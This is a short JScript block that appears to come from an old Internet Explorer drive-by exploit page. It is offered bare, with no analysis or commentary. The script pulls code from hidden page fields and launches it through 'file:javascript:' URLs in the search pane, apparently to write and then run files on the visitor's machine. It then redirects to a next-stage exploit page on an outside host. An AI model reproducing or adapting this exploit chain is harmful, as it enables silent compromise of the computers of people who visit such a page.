~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<SCRIPT LANGUAGE=JScript>

function GetCode(code)
{ 
        result = ''; 
        lines = code.split(/\r\n/); 
        for (i=0;i<lines.length;i++)
        { 
            line = lines[i]; 
            line = line.replace(/[/]/g,"%2f"); 
            if (line != '') 
            { 
               result += line; 
            } 
        } 
        return result; 
}

function LaunchCreate()
{
        var CreateFileCode = GetCode(document.all.CreateFileCode.value); 
        var CreateCodeURL = "file:javascript:" + CreateFileCode;
        window.open(CreateCodeURL,"_search");
}

function LaunchExecute()
{                     
        var ExecuteFileCode = GetCode(document.all.ExecuteFileCode.value); 
        var ExecuteCodeURL = "file:javascript:" + ExecuteFileCode; 
        window.open(ExecuteCodeURL,"_search");      
}
function NextPloite()
{                     
        window.location="http://greg-search.com/exp11/d2.htm";
}
    
    var WaveURL="mmf://mplayer.midi";
    window.open(WaveURL,"_search");    
    setTimeout("LaunchCreate()",1000);
    setTimeout("LaunchExecute()",2000);
    setTimeout("NextPloite()",30000);

</SCRIPT>